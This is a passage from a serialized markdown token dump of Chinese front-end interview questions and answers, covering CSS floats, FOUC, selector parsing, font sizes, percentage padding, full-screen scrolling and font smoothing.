类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"出现浮动的原因：","text":"出现浮动的原因：","tokens":[{"type":"text","raw":"出现浮动的原因：","text":"出现浮动的原因：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"浮动元素碰到包含它的边框或者浮动元素的边框停留。在CSS规范中，浮动定位不属于正常的页面流，而是独立定位的，所以文档流的块框表现得就像浮动框不存在一样。浮动元素会漂浮在文档流的块框上。","text":"浮动元素碰到包含它的边框或者浮动元素的边框停留。在CSS规范中，浮动定位不属于正常的页面流，而是独立定位的，所以文档流的块框表现得就像浮动框不存在一样。浮动元素会漂浮在文档流的块框上。","tokens":[{"type":"text","raw":"浮动元素碰到包含它的边框或者浮动元素的边框停留。在CSS规范中，浮动定位不属于正常的页面流，而是独立定位的，所以文档流的块框表现得就像浮动框不存在一样。浮动元素会漂浮在文档流的块框上。","text":"浮动元素碰到包含它的边框或者浮动元素的边框停留。在CSS规范中，浮动定位不属于正常的页面流，而是独立定位的，所以文档流的块框表现得就像浮动框不存在一样。浮动元素会漂浮在文档流的块框上。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"关于css的定位机制：普通流，浮动，绝对定位（position：fixed是position：absolute的一个子类）。浮动的框可以左右移动，直到它的外边缘遇到包含框或者另一个浮动框的边缘，所以才说浮动定位不属于正常的页面流。文档中的普通流就会表现得和浮动框不存在一样，当浮动框高度超出包含框的时候，就会出现包含框不会自动伸缩高度类笔盒浮动元素。所以，只含有浮动元素的父容器在显示时不需要考虑子元素的位置，就造成显示父容器像空容器一样。","text":"关于css的定位机制：普通流，浮动，绝对定位（position：fixed是position：absolute的一个子类）。浮动的框可以左右移动，直到它的外边缘遇到包含框或者另一个浮动框的边缘，所以才说浮动定位不属于正常的页面流。文档中的普通流就会表现得和浮动框不存在一样，当浮动框高度超出包含框的时候，就会出现包含框不会自动伸缩高度类笔盒浮动元素。所以，只含有浮动元素的父容器在显示时不需要考虑子元素的位置，就造成显示父容器像空容器一样。","tokens":[{"type":"text","raw":"关于css的定位机制：普通流，浮动，绝对定位（position：fixed是position：absolute的一个子类）。浮动的框可以左右移动，直到它的外边缘遇到包含框或者另一个浮动框的边缘，所以才说浮动定位不属于正常的页面流。文档中的普通流就会表现得和浮动框不存在一样，当浮动框高度超出包含框的时候，就会出现包含框不会自动伸缩高度类笔盒浮动元素。所以，只含有浮动元素的父容器在显示时不需要考虑子元素的位置，就造成显示父容器像空容器一样。","text":"关于css的定位机制：普通流，浮动，绝对定位（position：fixed是position：absolute的一个子类）。浮动的框可以左右移动，直到它的外边缘遇到包含框或者另一个浮动框的边缘，所以才说浮动定位不属于正常的页面流。文档中的普通流就会表现得和浮动框不存在一样，当浮动框高度超出包含框的时候，就会出现包含框不会自动伸缩高度类笔盒浮动元素。所以，只含有浮动元素的父容器在显示时不需要考虑子元素的位置，就造成显示父容器像空容器一样。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"浮动带来的问题：","text":"浮动带来的问题：","tokens":[{"type":"text","raw":"浮动带来的问题：","text":"浮动带来的问题：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 父元素的高度无法被撑开，影响与父元素同级的元素\\n\\n- 与浮动元素同级的非浮动元素（内联元素）会跟随其后\\n\\n- 若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 父元素的高度无法被撑开，影响与父元素同级的元素\\n\\n","task":false,"loose":true,"text":"父元素的高度无法被撑开，影响与父元素同级的元素\\n","tokens":[{"type":"text","raw":"父元素的高度无法被撑开，影响与父元素同级的元素\\n","text":"父元素的高度无法被撑开，影响与父元素同级的元素","tokens":[{"type":"text","raw":"父元素的高度无法被撑开，影响与父元素同级的元素","text":"父元素的高度无法被撑开，影响与父元素同级的元素","escaped":false}]}]},{"type":"list_item","raw":"- 与浮动元素同级的非浮动元素（内联元素）会跟随其后\\n\\n","task":false,"loose":true,"text":"与浮动元素同级的非浮动元素（内联元素）会跟随其后\\n","tokens":[{"type":"text","raw":"与浮动元素同级的非浮动元素（内联元素）会跟随其后\\n","text":"与浮动元素同级的非浮动元素（内联元素）会跟随其后","tokens":[{"type":"text","raw":"与浮动元素同级的非浮动元素（内联元素）会跟随其后","text":"与浮动元素同级的非浮动元素（内联元素）会跟随其后","escaped":false}]}]},{"type":"list_item","raw":"- 若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","task":false,"loose":true,"text":"若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","tokens":[{"type":"text","raw":"若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","text":"若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","tokens":[{"type":"text","raw":"若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","text":"若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"清除浮动的方式：","text":"清除浮动的方式：","tokens":[{"type":"text","raw":"清除浮动的方式：","text":"清除浮动的方式：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 父级div定义height\\n\\n- 最后一个浮动元素后加空div标签并设置属性 clear:both\\n\\n- 包含浮动元素的父标签添加样式 overflow:hidden\\n\\n- 父级div定义伪类:after 和 zoom\\n\\n- 父级div定义伪类:after 和 display:table\\n\\n- 父级div定义伪元素:after 和 content:” “","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 父级div定义height\\n\\n","task":false,"loose":true,"text":"父级div定义height\\n","tokens":[{"type":"text","raw":"父级div定义height\\n","text":"父级div定义height","tokens":[{"type":"text","raw":"父级div定义height","text":"父级div定义height","escaped":false}]}]},{"type":"list_item","raw":"- 最后一个浮动元素后加空div标签并设置属性 clear:both\\n\\n","task":false,"loose":true,"text":"最后一个浮动元素后加空div标签并设置属性 clear:both\\n","tokens":[{"type":"text","raw":"最后一个浮动元素后加空div标签并设置属性 clear:both\\n","text":"最后一个浮动元素后加空div标签并设置属性 clear:both","tokens":[{"type":"text","raw":"最后一个浮动元素后加空div标签并设置属性 clear:both","text":"最后一个浮动元素后加空div标签并设置属性 clear:both","escaped":false}]}]},{"type":"list_item","raw":"- 包含浮动元素的父标签添加样式 overflow:hidden\\n\\n","task":false,"loose":true,"text":"包含浮动元素的父标签添加样式 overflow:hidden\\n","tokens":[{"type":"text","raw":"包含浮动元素的父标签添加样式 overflow:hidden\\n","text":"包含浮动元素的父标签添加样式 overflow:hidden","tokens":[{"type":"text","raw":"包含浮动元素的父标签添加样式 overflow:hidden","text":"包含浮动元素的父标签添加样式 overflow:hidden","escaped":false}]}]},{"type":"list_item","raw":"- 父级div定义伪类:after 和 zoom\\n\\n","task":false,"loose":true,"text":"父级div定义伪类:after 和 zoom\\n","tokens":[{"type":"text","raw":"父级div定义伪类:after 和 zoom\\n","text":"父级div定义伪类:after 和 zoom","tokens":[{"type":"text","raw":"父级div定义伪类:after 和 zoom","text":"父级div定义伪类:after 和 zoom","escaped":false}]}]},{"type":"list_item","raw":"- 父级div定义伪类:after 和 display:table\\n\\n","task":false,"loose":true,"text":"父级div定义伪类:after 和 display:table\\n","tokens":[{"type":"text","raw":"父级div定义伪类:after 和 display:table\\n","text":"父级div定义伪类:after 和 display:table","tokens":[{"type":"text","raw":"父级div定义伪类:after 和 display:table","text":"父级div定义伪类:after 和 display:table","escaped":false}]}]},{"type":"list_item","raw":"- 父级div定义伪元素:after 和 content:” “","task":false,"loose":true,"text":"父级div定义伪元素:after 和 content:” “","tokens":[{"type":"text","raw":"父级div定义伪元素:after 和 content:” “","text":"父级div定义伪元素:after 和 content:” “","tokens":[{"type":"text","raw":"父级div定义伪元素:after 和 content:” “","text":"父级div定义伪元素:after 和 content:” “","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最好的方式是给父元素添加overflow:hidden","text":"最好的方式是给父元素添加overflow:hidden","tokens":[{"type":"text","raw":"最好的方式是给父元素添加overflow:hidden","text":"最好的方式是给父元素添加overflow:hidden","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 53. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？\\n\\n","depth":2,"text":"53. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？","tokens":[{"type":"text","raw":"53. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？","text":"53. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"FOUC - Flash Of Unstyled Content 文档样式闪烁","text":"FOUC - Flash Of Unstyled Content 文档样式闪烁","tokens":[{"type":"text","raw":"FOUC - Flash Of Unstyled Content 文档样式闪烁","text":"FOUC - Flash Of Unstyled Content 文档样式闪烁","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当样式表晚于结构性html加载时，页面以无样式显示>闪现>再按样式展示出来，对于用户来说就是页面闪烁了一下","text":"当样式表晚于结构性html加载时，页面以无样式显示>闪现>再按样式展示出来，对于用户来说就是页面闪烁了一下","tokens":[{"type":"text","raw":"当样式表晚于结构性html加载时，页面以无样式显示>闪现>再按样式展示出来，对于用户来说就是页面闪烁了一下","text":"当样式表晚于结构性html加载时，页面以无样式显示>闪现>再按样式展示出来，对于用户来说就是页面闪烁了一下","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"产生原因：","text":"产生原因：","tokens":[{"type":"text","raw":"产生原因：","text":"产生原因：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"由于浏览器渲染机制（比如firefox）对CSS和HTML文件的解析顺序是不一样的。Firefox在解析html时，如果遇到link标签引入的css文件，那么它会暂停html的解析，优先加载css文件，CSS文件加载完毕后才会继续解析html，这就导致了“无样式内容闪烁”。","text":"由于浏览器渲染机制（比如firefox）对CSS和HTML文件的解析顺序是不一样的。Firefox在解析html时，如果遇到link标签引入的css文件，那么它会暂停html的解析，优先加载css文件，CSS文件加载完毕后才会继续解析html，这就导致了“无样式内容闪烁”。","tokens":[{"type":"text","raw":"由于浏览器渲染机制（比如firefox）对CSS和HTML文件的解析顺序是不一样的。Firefox在解析html时，如果遇到link标签引入的css文件，那么它会暂停html的解析，优先加载css文件，CSS文件加载完毕后才会继续解析html，这就导致了“无样式内容闪烁”。","text":"由于浏览器渲染机制（比如firefox）对CSS和HTML文件的解析顺序是不一样的。Firefox在解析html时，如果遇到link标签引入的css文件，那么它会暂停html的解析，优先加载css文件，CSS文件加载完毕后才会继续解析html，这就导致了“无样式内容闪烁”。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"解决方法：","text":"解决方法：","tokens":[{"type":"text","raw":"解决方法：","text":"解决方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 把样式表放到文档的head\\n\\n- 使用@import url()将样式导入\\n\\n- 使用link标签将样式文件链接到HTML文件中","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 把样式表放到文档的head\\n\\n","task":false,"loose":true,"text":"把样式表放到文档的head\\n","tokens":[{"type":"text","raw":"把样式表放到文档的head\\n","text":"把样式表放到文档的head","tokens":[{"type":"text","raw":"把样式表放到文档的head","text":"把样式表放到文档的head","escaped":false}]}]},{"type":"list_item","raw":"- 使用@import url()将样式导入\\n\\n","task":false,"loose":true,"text":"使用@import url()将样式导入\\n","tokens":[{"type":"text","raw":"使用@import url()将样式导入\\n","text":"使用@import url()将样式导入","tokens":[{"type":"text","raw":"使用@import url()将样式导入","text":"使用@import url()将样式导入","escaped":false}]}]},{"type":"list_item","raw":"- 使用link标签将样式文件链接到HTML文件中","task":false,"loose":true,"text":"使用link标签将样式文件链接到HTML文件中","tokens":[{"type":"text","raw":"使用link标签将样式文件链接到HTML文件中","text":"使用link标签将样式文件链接到HTML文件中","tokens":[{"type":"text","raw":"使用link标签将样式文件链接到HTML文件中","text":"使用link标签将样式文件链接到HTML文件中","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 54. 浏览器是怎样解析CSS选择器的？\\n\\n","depth":2,"text":"54. 浏览器是怎样解析CSS选择器的？","tokens":[{"type":"text","raw":"54. 浏览器是怎样解析CSS选择器的？","text":"54. 浏览器是怎样解析CSS选择器的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"CSS选择器的解析是从右向左解析的，为了避免对所有元素进行遍历。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。\\n而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。","text":"CSS选择器的解析是从右向左解析的，为了避免对所有元素进行遍历。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。\\n而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。","tokens":[{"type":"text","raw":"CSS选择器的解析是从右向左解析的，为了避免对所有元素进行遍历。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。\\n而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。","text":"CSS选择器的解析是从右向左解析的，为了避免对所有元素进行遍历。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。\\n而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 55. 在网页中的应该使用奇数还是偶数的字体？为什么呢？\\n\\n","depth":2,"text":"55. 在网页中的应该使用奇数还是偶数的字体？为什么呢？","tokens":[{"type":"text","raw":"55. 在网页中的应该使用奇数还是偶数的字体？为什么呢？","text":"55. 在网页中的应该使用奇数还是偶数的字体？为什么呢？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。","text":"使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。","tokens":[{"type":"text","raw":"使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。","text":"使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 56. 元素竖向的百分比设定是相对于容器的高度吗？\\n\\n","depth":2,"text":"56. 元素竖向的百分比设定是相对于容器的高度吗？","tokens":[{"type":"text","raw":"56. 元素竖向的百分比设定是相对于容器的高度吗？","text":"56. 元素竖向的百分比设定是相对于容器的高度吗？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。","text":"当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。","tokens":[{"type":"text","raw":"当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。","text":"当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 57. 全屏滚动的原理是什么？用到了CSS的哪些属性？\\n\\n","depth":2,"text":"57. 全屏滚动的原理是什么？用到了CSS的哪些属性？","tokens":[{"type":"text","raw":"57. 全屏滚动的原理是什么？用到了CSS的哪些属性？","text":"57. 全屏滚动的原理是什么？用到了CSS的哪些属性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现\\noverflow：hidden；transition：all 1000ms ease；","text":"原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现\\noverflow：hidden；transition：all 1000ms ease；","tokens":[{"type":"text","raw":"原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现\\noverflow：hidden；transition：all 1000ms ease；","text":"原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现\\noverflow：hidden；transition：all 1000ms ease；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 58.让页面里的字体变清晰，变细用CSS怎么做？\\n\\n","depth":2,"text":"58.让页面里的字体变清晰，变细用CSS怎么做？","tokens":[{"type":"text","raw":"58.让页面里的字体变清晰，变细用CSS怎么做？","text":"58.让页面里的字体变清晰，变细用CSS怎么做？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"-webkit-font-smoothing 在 window 系统下没有起作用，但是在 IOS 设备上起作用 -webkit-font-smoothing：antialiased 是最佳的，灰度平滑。","text":"-webkit-font-smoothing 在 window 系统下没有起作用，但是在 IOS 设备上起作用 -webkit-font-smoothing：antialiased 是最佳的，灰度平滑。","tokens":[{"type":"text","raw":"-webkit-font-smoothing 在 window 系统下没有起作用，但是在 IOS 设备上起作用 -webkit-font-smoothing：antialiased 是最佳的，灰度平滑。","text":"-webkit-font-smoothing 在 window 系统下没有起作用，但是在 IOS 设备上起作用 -webkit-font-smoothing：antialiased 是最佳的，灰度平滑。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 59. position:fixed; 在 android 下无效怎么处理 ？\\n\\n","depth":2,"text":"59. position:fixed; 在 android 下无效怎么处理 ？","tokens":[{"type":"text","raw":"59. position:fixed; 在 android 下无效怎么处理 ？","text":"59. position:fixed; 在 android 下无效怎么处理 ？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 